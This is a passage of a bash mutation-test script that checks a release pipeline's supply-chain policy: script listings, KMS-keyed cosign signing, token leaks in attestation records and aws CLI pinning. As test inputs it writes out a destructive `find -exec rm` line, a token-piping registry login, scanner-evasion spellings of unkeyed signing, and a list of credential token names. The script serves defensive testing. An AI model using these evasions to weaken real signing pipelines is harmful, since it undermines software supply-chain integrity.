sm x_find    release-publish 'find . -name "*.apk" -exec rm {} +'                "'find'"            "AC10 find -exec"
sm x_comment release-assets  '# docker build is not used here'                   "build command"     "AC7 a build command named in a comment (over-reports by design)"
# ---- the list of release scripts ----------------------------------------------------------------------------------------------
lm() { rm -rf "$work/$1"; cp -r "$work/s" "$work/$1"; python3 - "$work/$1" "$2" "$3" <<'PY'
import json, sys
p = sys.argv[1] + "/.github/policy/chain-scripts.json"
d = json.load(open(p)); exec(sys.argv[3], {"d": d, "rows": {r["path"]: r for r in d["scripts"]}}); json.dump(d, open(p, "w"))
PY
  expect caught "$5" "$4" listed "$work/$1/.github/policy/chain-scripts.json" "$work/$1"; }
lm l_missing   x 'd["scripts"] = [r for r in d["scripts"] if r["path"] != "bin/release-sign.sh"]'            'not listed'   "AC10 a release script not listed"
lm l_nohelper  x 'd["scripts"] = [r for r in d["scripts"] if r["path"] != "bin/witnessed.sh"]'               'not listed'   "AC10 the witnessed helper not listed"
lm l_nolocal   x 'd["scripts"] = [r for r in d["scripts"] if r["path"] != "bin/witnessed-local.sh"]'         'not listed'   "AC10 the throwaway-key wrapper (release-evidence's helper) not listed"
lm l_tools     x 'rows["bin/release-publish.sh"]["tools"].append("docker")'                                  'exactly the tools' "AC10 a script lists a tool it should not"
lm l_tools2    x 'rows["bin/release-sign.sh"]["tools"].remove("jq")'                                         'exactly the tools' "AC10 a script lists fewer tools than it uses"
lm l_signs     x 'rows["bin/release-publish.sh"]["signs"] = "other"'                                         'signs:'       "AC10 the publish script listed as a signer"
lm l_signs2    x 'rows["bin/release-sign.sh"]["signs"] = False'                                              'signs:'       "AC10 the signing script listed as not signing"
lm l_reason    x 'rows["bin/release-apks.sh"]["reason"] = ""'                                                'reason'       "AC10 a signer without a reason"
lm l_runs      x 'rows["bin/release-verify.sh"]["runs"].append("bin/other.py")'                              'may start'    "AC10 a script allowed to start another one"
lm l_pvmiss    x 'd["scripts"] = [r for r in d["scripts"] if r["path"] != "bin/release-postverify.sh"]'     'not listed'   "AC10 (rule 79) the post-publish script not listed"
lm l_sha       x 'rows["bin/release-assets.sh"]["sha256"] = "0" * 64'                                        'sha256'       "AC10 a script changed after it was listed"
rm -rf "$work/l_gone"; cp -r "$work/s" "$work/l_gone"; rm "$work/l_gone/bin/release-assets.sh"
expect caught "AC10 a listed script that does not exist" "missing" listed "$work/l_gone/.github/policy/chain-scripts.json" "$work/l_gone"
# ---- AC12: the Witness record -------------------------------------------------------------------------------------------------
rec() { expect caught "$3" "$2" record "$work/$1.json" SENTINEL-VALUE-123; }
rec r_name "GH_TOKEN"                    "AC12 the job token variable named in the record (inside the base64 payload)"
rec r_dh   "DOCKERHUB_TOKEN"             "AC12 the registry token variable named in the record"
rec r_idt  "ACTIONS_ID_TOKEN_REQUEST_URL" "AC12 the identity token request in the record"
rec r_rt   "ACTIONS_RUNTIME_TOKEN"       "AC12 the runtime token in the record"
rec r_val  "credential value"            "AC12 a credential value in the record"
rec r_jwt  "compact JWT"                 "AC12 a compact JWT in the record"
rec r_plain "DSSE envelope"              "AC12 a bare statement is not an envelope (it would hide the payload from a text search)"
rec r_garbage "DSSE envelope"            "AC12 a payload that is not a statement"
# ---- AC13: the old authorization machinery ----------------------------------------------------------------------------------
mkdir -p "$work/ra/bin" "$work/ra/.github/workflows"; : > "$work/ra/bin/authorize-acceptance-check.py"
expect caught "AC13 bin/authorize-acceptance-check.py still exists" "authorize-acceptance-check.py" removed "$work/ra"
mkdir -p "$work/rb/bin"; : > "$work/rb/bin/authorize-acceptance-check-test.sh"
expect caught "AC13 its test still exists" "authorize-acceptance-check-test.sh" removed "$work/rb"
mkdir -p "$work/rc/.github/workflows"; printf 'run: cosign verify-attestation --type release-authorization x\n' > "$work/rc/.github/workflows/release.yml"
expect caught "AC13 release.yml still reads the authorization predicate" "authorization predicate" removed "$work/rc"
mkdir -p "$work/rd/.github/workflows"; printf 'jobs:\n  authorization:\n    uses: ./.github/workflows/stage-authorize.yml\n' > "$work/rd/.github/workflows/release.yml"
expect caught "AC13 release.yml still has an authorization job" "authorization job" removed "$work/rd"
# ---- AC13: the metadata is made in order by bin/release-sign.sh (the VEX and CSAF before the manifest and the list, the manifest records their sha256, nothing signed earlier) ---------
expect ok "AC13 the real bin/release-sign.sh makes the metadata in order from Build's verified digests and items" "" metadata "$root/bin/release-sign.sh"
sg() { if mutate "$root/bin/release-sign.sh" "$work/$1.sh" "$2" "$3"; then expect caught "$5" "$4" metadata "$work/$1.sh"; fi; }
sg m_novex   'python3 bin/vex-forms\.py [^\n]*\n'                                              ''                              'no vex step'        "AC13 the VEX and CSAF files are not generated"
sg m_noitems 'images --digests witness-build/digests.json --images-dir images --items witness-build/items.json' 'images --digests witness-build/digests.json --images-dir images' 'must carry --items' "AC13 the vex-forms input is not checked against Build's verified items"
sg m_nomitem 'manifest --digests witness-build/digests.json --images-dir images --items witness-build/items.json' 'manifest --digests witness-build/digests.json --images-dir images' 'must carry --items' "AC13 the manifest is not checked against Build's verified items"
sg m_novdir  ' --vex-dir release-metadata'                                                       ''                              'must carry --vex-dir' "AC13 the manifest does not record the VEX files' sha256"
sg m_nobase  'baseline=\$\(python3 bin/release-metadata\.py baseline [^\n]*\n'                              ''                              'no baseline step'   "AC19 the baseline is not read from Build's verified admission-baseline.json"
sg m_basetag 'baseline --admission witness-build/admission-baseline.json --tag "\$GITHUB_REF_NAME"'    'baseline --admission witness-build/admission-baseline.json --tag v0.3.0' 'must carry --tag' "AC19 the baseline check is not made for this run's tag"
sg m_ownbase ' --baseline-version "\$baseline"'                                                       ' --baseline-version "$GITHUB_REF_NAME"' 'must carry --baseline-version' "AC19 the manifest takes the tag's own name as the baseline (a CI patch tag has no such file)"
sg m_noatt   'for digest in "\$prod" "\$fips"; do\n  cosign attest [^\n]*\n  cosign attest [^\n]*\ndone\n'  ''                          'no attest step' "AH the release manifest is no longer attached to the public digests (the v0.2.x referrer customers have)"
sg m_atttype 'attestations/release-manifest/v1 "ghcr'  'attestations/release-manifest/v2 "ghcr'                         'exactly these two' "AH the referrer type is not release-manifest/v1"
sg m_attpred 'release-metadata/release-manifest.json --type' 'release-metadata/vex-images.json --type'            'exactly these two' "AH the attested predicate is not the verified manifest"
sg m_attghcr ' "ghcr.io/\$repo@\$digest"' ' "ghcr.io/$repo@$digest" || true'                                    'exactly these two' "AH the GHCR referrer is best-effort (it is required)"
sg m_attnohub 'cosign attest [^\n]*docker.io[^\n]*\n' ''                                                         'exactly these two' "AH the Docker Hub mirror referrer is missing"
sg m_attearly '(for host in ghcr.io docker.io; do\n  for digest in "\$prod" "\$fips"; do\n    cosign sign --yes[^\n]*\n  done\ndone\n)((?:#[^\n]*\n)*for digest in[^\n]*\n  cosign attest[^\n]*\n  cosign attest[^\n]*\ndone\n)' '\2\1' 'must come after every image signature' "AH the manifest attestations before the image signatures"
sg m_nolist  'python3 bin/release-metadata\.py list [^\n]*\n'                                   ''                              'no list step'       "AC13 release-files.sha256 is not made"
sg m_early   '(python3 bin/release-metadata\.py images [^\n]*\n)'                              'cosign login ghcr.io -u x --password-stdin <<< "$GH_TOKEN"\n\1' 'must come before' "AC13 a registry login (the first cosign call) before the metadata exists"
sg m_modkey  '--key "\$RELEASE_KMS_KEY_REF" (--signing-config [^\n]*--bundle release-evidence/fscache-modules\.spdx\.json\.bundle)' '\1' 'every cosign signing line' "0707 a Go module SBOM signed without the release KMS key"
sg m_moddir  ' --modules-dir apks/ubuntu-24\.04 '  ' --modules-dir apks/ubuntu-24.04-arm '  'must carry --modules-dir' "0707 the manifest checks another directory than the one the module SBOMs are signed from"
python3 - "$root/bin/release-sign.sh" "$work/m_swap.sh" <<'PY'
import sys
L = open(sys.argv[1]).read().split("\n")
a = next(i for i, l in enumerate(L) if "release-metadata.py manifest" in l); b = next(i for i, l in enumerate(L) if "bin/vex-forms.py" in l)
L[a], L[b] = L[b], L[a]
open(sys.argv[2], "w").write("\n".join(L))
PY
expect caught "AC13 the manifest is made before the VEX and CSAF files exist" "must come before" metadata "$work/m_swap.sh"
# ---- the real repository (RED until PR 4 is implemented) ---------------------------------------------------------------------
expect ok "the real release.yml: release-compare, release-verify, release, sign-release and release-evidence are the Release stage" "" stage "$root/.github/workflows/release.yml"
expect ok "the real credentials reach only the steps that need them" "" credentials "$root/.github/workflows/release.yml"
expect ok "nothing outside the release job and sign-release holds packages write or a registry credential, and the release job holds no id-token" "" others "$root"
expect ok "the real release.yml: release-compare needs check, sign, sign-rebuild and sign-check, the release jobs follow in a line, the guard is each job if, no tag" "" graph "$root/.github/workflows/release.yml"
expect ok "the real bin/release-verify.sh verifies in rule 69's order" "" verify "$root/bin/release-verify.sh"
for n in release-verify release-apks release-publish release-sign release-assets release-postverify; do
  expect ok "the real bin/$n.sh is plain" "" scan "$root/bin/$n.sh" "$root/.github/policy/chain-scripts.json"
done
expect ok "the real release scripts are listed in chain-scripts.json" "" listed "$root/.github/policy/chain-scripts.json" "$root"
expect ok "the old authorization machinery is gone from the real repository" "" removed "$root"
# round 1 (Codex PR 415): the requirement text and the stage file's header say only what is enforced about credentials (no job holds a write token or a secret before an earlier job verified; no explicit credential binding up to release-verify)
python3 - "$root/requirements/requirements.yaml" <<'PY' && ok "text: REQ-CHAIN-007-AC1 does not claim that no credential exists before the tool installs, and states the explicit bindings and the verify gate" || bad "text: REQ-CHAIN-007-AC1 overstates credential absence"
import sys, yaml
t = next(a for q in yaml.safe_load(open(sys.argv[1]))["requirements"] if q["id"] == "REQ-CHAIN-007" for a in q["acceptance_criteria"] if a["id"] == "REQ-CHAIN-007-AC1")["then"]
assert "before any credential exists" not in t and "before any credential step" in t and "needs: release-compare" in t and "no env" in t, t[:200]
PY
python3 - "$root/.github/workflows/release.yml" "$root/bin/release-verify.sh" <<'PY' && ok "text: the release.yml header and release-verify.sh do not say that no credential exists before release-verify" || bad "text: a header comment overstates credential absence"
import sys
for f in sys.argv[1:]:
    t = open(f).read()
    assert "no credential exists yet" not in t and "No credential exists in this step" not in t, f
PY
python3 - "$root/requirements/requirements.yaml" "$root/.github/policy/chain-scripts.json" "$root/.github/workflows/release.yml" <<'PY' && ok "text: the REQ-CHAIN-007 statement, the release-verify row reason and the release.yml header make no blanket claim that no credential exists" || bad "text: a statement, reason or header still overstates credential absence"
import json, sys, yaml
q = next(q for q in yaml.safe_load(open(sys.argv[1]))["requirements"] if q["id"] == "REQ-CHAIN-007")
assert "before any credential exists" not in q["statement"], "statement"
assert "explicitly binds a credential" in q["statement"], "statement says explicitly"
row = next(r for r in json.load(open(sys.argv[2]))["scripts"] if r["path"] == "bin/release-verify.sh")
assert "no credential exists" not in row["reason"], "row reason"
h = open(sys.argv[3]).read().split("\nname:")[0]
assert "it holds them only in the Witness steps that need them" not in h and "so no credential or key is read" not in h, "header"
PY
# ---- handoff 0713 P3 / cache#853: release signing with the release KMS key, wired end to end --------------------------------------------------------
# every signing line of bin/release-sign.sh is judged as a whole line, not by how it starts: a second --key, a prefix, another spelling of the word cosign all fail
KW='cosign signing line'
sg m_k_dup   '(--signing-config \.github/policy/cosign-signing-config\.json )("\$host/\$repo@\$digest")'   '\1--key awskms:///alias/other \2'    "$KW" "P3 a second --key after the approved arguments of the image signature"
sg m_k_empty '(--signing-config \.github/policy/cosign-signing-config\.json )("\$host/\$repo@\$digest")'   '\1--key "" \2'                       "$KW" "P3 an appended empty --key (cosign makes an ephemeral key of it) on the image signature"
sg m_k_cmd   '(\n +)cosign sign --yes --key'                                                                '\1command cosign sign --yes --key'  "$KW" "P3 the image signature spelled \`command cosign sign\`"
sg m_k_tab   '(\n +)cosign sign --yes --key'                                                                $'\\1cosign\tsign --yes --key'        "$KW" "P3 a tab between cosign and sign"
sg m_k_two   '(\n)cosign sign-blob --yes --key'                                                             '\1cosign  sign-blob --yes --key'    "$KW" "P3 two spaces between cosign and sign-blob"
sg m_k_semi  '(mkdir -p release-evidence\n)'                                                                '\1true; cosign sign-blob --yes --bundle b.json policy.json\n' "$KW" "P3 an unkeyed sign-blob after a semicolon"
sg m_k_glob  '(\n +)cosign sign --yes --key'                                                                '\1cosign --verbose sign --yes --key' "$KW" "P3 a global flag before sign"
sg m_k_or    '(\n +)cosign sign --yes --key'                                                                '\1false || cosign sign --yes --key' "$KW" "P3 the image signature after ||"
sg m_k_if    '(\n +)(cosign sign --yes --key [^\n]*)'                                                       '\1if \2; then :; fi'                "$KW" "P3 the image signature as an if condition"
sg m_k_ab    '(mkdir -p release-evidence\n)'                                                                '\1cosign attest-blob --yes --signing-config .github/policy/cosign-signing-config.json --statement s.json --bundle b.json\n' "$KW" "P3 an unkeyed cosign attest-blob line"
sg m_k_var   '(\ncosign sign-blob --yes --key )"\$RELEASE_KMS_KEY_REF"'                                      '\1"$OTHER_KEY"'                      "$KW" "P3 a sign-blob keyed with another variable"
sg m_k_eq    '(\ncosign sign-blob --yes )--key "\$RELEASE_KMS_KEY_REF"'                                    '\1--key="$RELEASE_KMS_KEY_REF"'      "$KW" "P3 --key= instead of --key and a space"
cat > "$work/kmsdocs.py" <<'PY'
import json, os, re, sys
root = sys.argv[1]
out = []
def case(label, good, why=""): out.append(("ok   " if good else "FAIL ") + "P3 " + label + ("" if good else " -> " + str(why)[:220]))
def read(f): return open(os.path.join(root, f)).read()
def commands(t):
    """the verify commands of the fenced blocks, each with whether the block follows a sentence about releases before v0.3.0 (the older certificate form, which stays documented)"""
    out_ = []
    for m in re.finditer(r"```[a-z]*\n(.*?)```", t, re.S):
        older = "before v0.3.0" in t[max(0, m.start() - 700):m.start()].lower()
        for l in re.sub(r"\\\n\s*", " ", m.group(1)).split("\n"):
            l = l.strip()
            if re.match(r"cosign verify(-attestation|-blob)? ", l): out_.append((re.sub(r"\s+", " ", l), older))
    return out_
def customer_forms(cmds):
    return [c for c, older in cmds if not older and "slsa.dev/provenance" not in c and ("fosterstack/cache" in c or "<IMAGE_REF" in c or c.startswith("cosign verify-blob ") or "release-manifest" in c)]
KEY = "release.rsa.pub"
FETCH = re.compile(r"curl -fsSLO \"?https://raw\.githubusercontent\.com/fosterstack/cache/(v\$\{VER(SION)?\}|<TAG>)/build/keys/release\.rsa\.pub\"?")
def keyed(c): return re.search(r"--key[ =]release\.rsa\.pub(?= |$)", c) is not None and "--certificate-identity" not in c and len(re.findall(r"--key\b", c)) == 1
for f in ("docs/verify-release.md", "docs/verify-images.md", "docs/install.md", "docs/using-our-vex.md", "RELEASING.md"):
    txt = read(f)
    mine = customer_forms(commands(txt))
    bad_ = [c[:90] for c in mine if not keyed(c)]
    case("%s: every verify of an image, its manifest attestation or a signed release file (but the older certificate form) is exactly --key release.rsa.pub with no certificate identity (%d commands)" % (f, len(mine)), mine and not bad_, bad_[:1] or "no verify command found")
    if f == "docs/verify-release.md":   # REQ-CHAIN-008-AC8: the key is made by the steps of docs/verify-key.md, not fetched from build/keys/
        case("%s links to docs/verify-key.md for the release key (REQ-CHAIN-008-AC8)" % f, re.search(r"\]\((?:\./|docs/)?verify-key\.md(#[^)]*)?\)", txt) is not None)
        continue
    case("%s tells the reader to fetch release.rsa.pub from build/keys/ at the release tag (curl -fsSLO https://raw.githubusercontent.com/fosterstack/cache/<tag>/build/keys/release.rsa.pub)" % f, FETCH.search(re.sub(r"\s+", " ", txt)) is not None)
for f in ("docs/verify-release.md", "docs/verify-images.md", "docs/install.md", "docs/using-our-vex.md"):
    case("%s no longer says the release signatures are keyless" % f, "keyless" not in read(f).lower(), re.findall(r".*keyless.*", read(f), re.I)[:1])
rows = json.load(open(os.path.join(root, "docs/verify-release.cannot-run.json")))
img = [r["command"] for r in rows if ("<IMAGE_REF" in r["command"] and r["command"].startswith("cosign ")) or r["command"].startswith("cosign verify-blob ")]
bad_ = [c[:90] for c in img if not keyed(c)]
case("docs/verify-release.cannot-run.json (what release-postverify runs): every image and signed-file verify is exactly --key release.rsa.pub with no certificate identity (%d rows)" % len(img), img and not bad_, bad_[:1] or "no row found")
vcr = json.load(open(os.path.join(root, "docs/using-our-vex.cannot-run.json")))
vb = [b for b in vcr["blocks"] if "cosign verify-attestation" in b]
case("docs/using-our-vex.cannot-run.json: the manifest verify block is exactly --key release.rsa.pub with no certificate identity", vb and all(keyed(re.sub(r"\s+", " ", b.replace("\\\n", " "))) for b in vb), [b[:90] for b in vb][:1] or "no block found")
rl = re.sub(r"\s+", " ", read("RELEASING.md"))
case("RELEASING.md says once: until the key manifest is published, the key file named in this repository is the reference", rl.lower().count("until the key manifest is published, the key file named in this repository is the reference") == 1, rl.lower().count("until the key manifest is published"))
case("README.md no longer says the image is keylessly signed", "keylessly signed" not in read("README.md").lower())
for f, ph in (("RELEASING.md", "release files keyless"), ("docs/verify-images.md", "files keyless, under `stage-promote.yml`"), ("docs/verify-images.md", "cosign keyless blob-signature"), ("docs/verify-images.md", "There is no signing key to leak")):
    case("%s no longer says %r of the release signatures" % (f, ph), ph not in re.sub(r"\s+", " ", read(f)))
print("\n".join(out))
PY
while IFS= read -r l; do
  case "$l" in ok*) ok "${l#ok   }";; *) bad "${l#FAIL }";; esac
done < <(python3 "$work/kmsdocs.py" "$root" 2>&1)
# only bin/release-sign.sh may run cosign to sign: a keyed signing line added to another release script is caught by its row's tool list
rsx() { mkdir -p "$work/rsx_$1"; cp "$root/bin/$1.sh" "$work/rsx_$1/$1.sh"
  printf '\ncosign sign-blob --yes --key "$RELEASE_KMS_KEY_REF" --signing-config .github/policy/cosign-signing-config.json --bundle b.json f\n' >> "$work/rsx_$1/$1.sh"
  expect caught "P3 a keyed cosign sign-blob line added to bin/$1.sh is refused (only bin/release-sign.sh lists cosign)" "uses 'cosign'" scan "$work/rsx_$1/$1.sh" "$root/.github/policy/chain-scripts.json"; }
for n in release-publish release-assets release-verify; do rsx "$n"; done
# KA-2 p4 group 4: no bare /usr/local/bin/aws path is left in any non-test script or workflow (the pinned aws CLI is installed under RUNNER_TEMP/aws-cli/aws by bin/install-scanner.sh aws-cli).
# The KA-0 guard's `--aws` defaults (found by name) in bin/chain-verify.py go with its cosign-path branch (ruling 3g) and are not this scan's subject.
bare_aws() { grep -rIn --include='*.sh' --include='*.py' --include='*.yml' -e '/usr/local/bin/aws' "$@" 2>/dev/null | grep -v -e '-test\.' ; }
if [ -z "$(bare_aws "$root/bin" "$root/.github/workflows")" ]; then ok "KA-2 p4 group 4 no script or workflow of the repository names /usr/local/bin/aws"; else bad "KA-2 p4 group 4 a bare aws path is left: $(bare_aws "$root/bin" "$root/.github/workflows" | head -3 | tr '\n' ' ')"; fi
mkdir -p "$work/bareaws"; printf '#!/usr/bin/env bash\npython3 bin/chain-verify.py kms-sign --aws /usr/local/bin/aws --key-ref x\n' > "$work/bareaws/m.sh"
if [ -n "$(bare_aws "$work/bareaws")" ]; then ok "KA-2 p4 group 4 mutant: a script that names /usr/local/bin/aws is found by the scan"; else bad "KA-2 p4 group 4 mutant: the bare-path scan missed a script that names /usr/local/bin/aws"; fi
# KA-2 p4 group 4 (ruling 09:17:40Z 1f; the four sign jobs of release.yml, REQ-CHAIN-001-AC9): every job of release.yml that reaches KMS (its steps run bin/witness-sign-staged.sh or bin/with-aws-token.sh) installs the pinned aws CLI
# (bin/install-scanner.sh aws-cli, which checks aws-cli/<pinned version>) in a step BEFORE the first of those steps; the judge is proven on a mutant that loses the install step.
ssjudge() { python3 - "$1" <<'SSPY'
import re, sys, yaml
d = yaml.safe_load(open(sys.argv[1]))
for job, j in d["jobs"].items():
    runs = [str(s.get("run", "")) for s in j.get("steps", [])]
    first = next((i for i, r in enumerate(runs) if "witness-sign-staged.sh" in r or "with-aws-token.sh" in r or re.search(r"bin/witnessed\.sh ", r)), None)   # bin/witnessed.sh signs its record through the KMS key (witnessed-local.sh does not)
    if first is None:
        continue
    inst = next((i for i, r in enumerate(runs) if r.strip() == "bash bin/install-scanner.sh aws-cli"), None)
    print("%s %s" % (job, "ok" if inst is not None and inst < first else "MISSING"))
SSPY
}
for jb in sign sign-rebuild sign-check sign-release; do
  ssout=$(ssjudge "$root/.github/workflows/release.yml")
  if [[ $'\n'"$ssout"$'\n' == *$'\n'"$jb ok"$'\n'* ]]; then ok "KA-2 p4 group 4 release.yml job $jb installs the pinned aws CLI before its first KMS-reaching step"; else bad "KA-2 p4 group 4 release.yml job $jb has no pinned aws CLI install before its first KMS-reaching step"; fi
done
grep -v 'install-scanner.sh aws-cli' "$root/.github/workflows/release.yml" > "$work/ss_noaws.yml"
ssout=$(ssjudge "$work/ss_noaws.yml")
if [[ "$ssout" == *MISSING* ]]; then ok "KA-2 p4 group 4 mutant: a release.yml without the aws CLI install is found by the judge"; else bad "KA-2 p4 group 4 mutant: the aws CLI judge missed a file without the install"; fi
# KA-2 p4 r2 (C1, round 1 ruling): no signer script leaves the aws CLI to be found by name. Every direct call of bin/chain-verify.py key-ref-check, kms-sign, sign or sign-record, and every call of bin/with-aws-token.sh kms-sign
# (the wrapper appends --aws only for sign and sign-record), carries the literal --aws "$RUNNER_TEMP/aws-cli/aws" in its (continued) line. The scan reads every non-test script of bin/.
awscalls() { python3 - "$@" <<'AWSPY'
import os, re, sys
bad = []
SUBS = r"(?:key-ref-check|kms-sign|sign-record|sign)(?![-\w])"
for pth in sys.argv[1:]:
    text = open(pth, errors="replace").read()
    # KA-2 p4 r2 C3: a call through a variable that the same file assigns a path ending in chain-verify.py ("$KMSSIGN") is judged like a literal call; "$AWS" counts as the RUNNER_TEMP literal only where the file
    # assigns AWS exactly the pinned path ($RUNNER_TEMP/aws-cli/aws, as $RUNNER_TEMP, ${RUNNER_TEMP} or ${RUNNER_TEMP:-}, quoted or not), never a bare name
    names = re.findall(r"(?m)^\s*(?:export\s+)?([A-Za-z_]\w*)=[\"']?\S*chain-verify\.py[\"']?\s*(?:#.*)?$", text)
    aws_pinned = re.search(r"(?m)^\s*AWS=(\"?)\$\{?RUNNER_TEMP(?::-)?\}?/aws-cli/aws\1\s*(?:#.*)?$", text) is not None
    callee = r"(?:\S*chain-verify\.py" + "".join(r"|[\"']?\$\{?%s\}?[\"']?" % re.escape(n) for n in names) + r")"
    for ln in re.sub(r"\\\n\s*", " ", text).split("\n"):
        if ln.lstrip().startswith("#"):
            continue
        direct = re.search(r"\S+\s+(?:-\S+\s+)*" + callee + r"\s+" + SUBS, ln)
        wrapped = re.search(r"with-aws-token\.sh\s+kms-sign(?![-\w])", ln)
        named = '--aws "$RUNNER_TEMP/aws-cli/aws"' in ln or (aws_pinned and '--aws "$AWS"' in ln)
        if (direct or wrapped) and not named:
            bad.append("%s: %s" % (os.path.basename(pth), re.sub(r"\s+", " ", ln.strip())[:110]))
print("\n".join(bad))
AWSPY
}
real_scripts=(); for f in "$root"/bin/*.sh; do case "$f" in *-test.sh) ;; *) real_scripts+=("$f") ;; esac; done
for f in "$root"/.github/workflows/*.y*ml; do real_scripts+=("$f"); done      # KA-2 p4 r2 C3: the run: text of the workflows is scanned too (none calls kms-sign today)
awsout=$(awscalls "${real_scripts[@]}")
if [ -z "$awsout" ]; then ok "KA-2 p4 r2 C1 every direct chain-verify.py key-ref-check/kms-sign/sign/sign-record call and every wrapped kms-sign call in bin/*.sh names --aws \"\$RUNNER_TEMP/aws-cli/aws\""; else bad "KA-2 p4 r2 C1 a signer call leaves the aws CLI to be found by name: $(head -3 <<< "$awsout" | tr '\n' ' ')"; fi
mkdir -p "$work/awscalls"
printf '#!/usr/bin/env bash\npython3 -I -B bin/chain-verify.py kms-sign --key-ref x --digest y\n' > "$work/awscalls/m_kms.sh"
printf '#!/usr/bin/env bash\npython3 -I -B bin/chain-verify.py key-ref-check --algorithm-guard\n' > "$work/awscalls/m_keyref.sh"
printf '#!/usr/bin/env bash\nbash bin/with-aws-token.sh kms-sign --key-ref x \\\n  --digest y --out z\n' > "$work/awscalls/m_wrapped.sh"
printf '#!/usr/bin/env bash\npython3 -I -B bin/chain-verify.py sign-record --payload p --out o\n' > "$work/awscalls/m_record.sh"
for m in m_kms m_keyref m_wrapped m_record; do
  if [ -n "$(awscalls "$work/awscalls/$m.sh")" ]; then ok "KA-2 p4 r2 C1 mutant: $m (a signer call with no --aws) is found by the scan"; else bad "KA-2 p4 r2 C1 mutant: the aws scan missed $m"; fi
done
# KA-2 p4 r2 C3: the variable call and the "$AWS" spelling
python3 - "$root/bin/release-sign-apks.sh" "$work/awscalls/m_apks_noaws.sh" "$work/awscalls/m_apks_bareaws.sh" <<'C3PY'
import re, sys
src = open(sys.argv[1]).read()
open(sys.argv[2], "w").write(re.sub(r"(kms-sign) --aws \"\$AWS\"", r"\1", src))                 # the kms-sign call through "$KMSSIGN" with --aws dropped (a no-op while the line has none)
open(sys.argv[3], "w").write(re.sub(r"(?m)^AWS=\S+", "AWS=aws", src))                              # AWS= assigned the bare name: "$AWS" no longer names the pinned path
C3PY
if cmp -s "$root/bin/release-sign-apks.sh" "$work/awscalls/m_apks_noaws.sh"; then bad "KA-2 p4 r2 C3 mutant: the --aws dropped mutation did not apply"; elif [ -n "$(awscalls "$work/awscalls/m_apks_noaws.sh")" ]; then ok "KA-2 p4 r2 C3 mutant: the real release-sign-apks.sh with --aws dropped from its kms-sign call through \"\$KMSSIGN\" is found by the scan"; else bad "KA-2 p4 r2 C3 mutant: the aws scan missed release-sign-apks.sh without --aws on its kms-sign call through a variable"; fi
if cmp -s "$root/bin/release-sign-apks.sh" "$work/awscalls/m_apks_bareaws.sh"; then bad "KA-2 p4 r2 C3 mutant: the bare AWS= mutation did not apply"; elif [ -n "$(awscalls "$work/awscalls/m_apks_bareaws.sh")" ]; then ok "KA-2 p4 r2 C3 mutant: the real release-sign-apks.sh with AWS=aws (so \"\$AWS\" is a bare name) is found by the scan"; else bad "KA-2 p4 r2 C3 mutant: the aws scan accepted \"\$AWS\" although AWS= is the bare name aws"; fi
printf 'jobs:\n  j:\n    steps:\n      - run: |\n          python3 -I -B bin/chain-verify.py kms-sign --key-ref x \\\n            --digest y\n' > "$work/awscalls/m_wf.yml"
if [ -n "$(awscalls "$work/awscalls/m_wf.yml")" ]; then ok "KA-2 p4 r2 C3 mutant: a workflow run: text calling kms-sign with no --aws is found by the scan"; else bad "KA-2 p4 r2 C3 mutant: the aws scan missed a workflow run: text calling kms-sign with no --aws"; fi
printf '#!/usr/bin/env bash\nbash bin/with-aws-token.sh sign --check --out o\npython3 -I -B bin/chain-verify.py key-ref-check --algorithm-guard --aws "$RUNNER_TEMP/aws-cli/aws"\n' > "$work/awscalls/c_ok.sh"
if [ -z "$(awscalls "$work/awscalls/c_ok.sh")" ]; then ok "KA-2 p4 r2 C1 control: the wrapper's sign (it appends --aws itself) and a key-ref-check with the literal --aws are not flagged"; else bad "KA-2 p4 r2 C1 control: the aws scan flags a call that is fine"; fi
python3 - "$root/bin/release-sign.sh" "$work/awscalls/m_release_sign.sh" <<'DROPPY'
import re, sys
src = open(sys.argv[1]).read()
out = re.sub(r"(chain-verify\.py key-ref-check[^\n]*?) --aws \"\$RUNNER_TEMP/aws-cli/aws\"", r"\1", src)       # the key-ref-check line of the real script, with --aws dropped (a no-op while the line has none)
open(sys.argv[2], "w").write(out)
DROPPY
if [ -n "$(awscalls "$work/awscalls/m_release_sign.sh")" ]; then ok "KA-2 p4 r2 C1 mutant: the real release-sign.sh with --aws dropped from its key-ref-check line is found by the scan"; else bad "KA-2 p4 r2 C1 mutant: the aws scan missed release-sign.sh without --aws on key-ref-check"; fi
# KA-2 p4 r2 (1b', round 1 ruling): the pinned aws CLI is installed only where KMS is reached: `bash bin/install-scanner.sh aws-cli` runs in no job of .github/workflows/*.yml except the four sign jobs of release.yml (sign, sign-rebuild, sign-check, sign-release); the release job holds no KMS role
awsfiles() { local r=$1; shopt -s globstar nullglob; printf '%s\n' "$r"/.github/workflows/*.y*ml "$r"/.github/actions/**/action.y*ml; }      # KA-2 p4 r2 C4: .yml and .yaml, workflows and composite actions
awsjobs() { python3 - "$@" <<'JOBSPY'
import os, re, sys, yaml
INST = re.compile(r"install-scanner\.sh\s+[\"']?aws-cli[\"']?(?![-\w])")      # bare or quoted
for pth in sys.argv[1:]:
    d = yaml.safe_load(open(pth)) or {}
    jobs = dict(d.get("jobs") or {})
    if isinstance(d.get("runs"), dict):
        jobs["(action)"] = {"steps": d["runs"].get("steps")}
    for job, j in jobs.items():
        if any(INST.search(str(s.get("run", ""))) for s in (j.get("steps") or [])):
            print("%s:%s" % (os.path.basename(pth), job))
JOBSPY
}
ALLOWED_AWS_JOBS=$'release.yml:sign\nrelease.yml:sign-check\nrelease.yml:sign-rebuild\nrelease.yml:sign-release'
mapfile -t aw_files < <(awsfiles "$root"); aj=$(awsjobs "${aw_files[@]}" | sort)
if [ "$aj" = "$ALLOWED_AWS_JOBS" ]; then ok "KA-2 p4 r2 1b' the aws CLI is installed in exactly the four sign jobs of release.yml (sign, sign-rebuild, sign-check, sign-release) and in no other job of any workflow, the release job included"; else bad "KA-2 p4 r2 1b' the aws CLI install runs in: $(tr '\n' ' ' <<< "$aj")"; fi
mkdir -p "$work/awsjobs"; python3 - "$root/.github/workflows/release.yml" "$work/awsjobs/release.yml" <<'JOBMUT'
import sys, yaml
d = yaml.safe_load(open(sys.argv[1]))
job = next(iter(d["jobs"]))
d["jobs"][job].setdefault("steps", []).insert(0, {"name": "install the aws CLI", "run": "bash bin/install-scanner.sh aws-cli"})
yaml.safe_dump(d, open(sys.argv[2], "w"))
JOBMUT
mj=$(awsjobs "$work/awsjobs/release.yml" | grep -vxF "$ALLOWED_AWS_JOBS" || true)
